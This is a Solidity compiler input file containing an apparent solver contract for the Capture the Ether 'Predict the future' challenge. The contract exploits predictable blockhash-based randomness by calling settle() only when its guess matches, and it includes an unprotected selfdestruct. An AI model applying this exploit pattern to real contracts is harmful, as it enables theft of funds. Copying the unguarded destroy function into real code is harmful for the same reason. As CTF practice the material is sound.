{
  "language": "Solidity",
  "sources": {
    "contracts/predictTheFuture.sol": {
      "content": "pragma solidity ^0.4.21;\n\ninterface PredictTheFutureChallenge{\n    function lockInGuess(uint8 n) external payable;\n    function settle() external;\n}\n\ncontract predictTheFuture{\n    uint8 answer = 3;\n    PredictTheFutureChallenge public target;\n\n    function setTargetContract(address _target) public{\n        target = PredictTheFutureChallenge(_target);\n    }\n\n    function guess() public{\n        target.lockInGuess.value(1 ether)(answer);\n    }\n\n    function success() public {\n        if(answer == (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10)){\n            target.settle();\n        }\n    }\n\n    function readAnswer() public view returns(uint8, uint8){\n        return (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10, answer);\n    }\n\n    function destroy() public{\n        selfdestruct(msg.sender);\n    }\n\n    function() external payable {}\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata"
        ],
        "": [
          "ast"
        ]
      }
    }
  }
}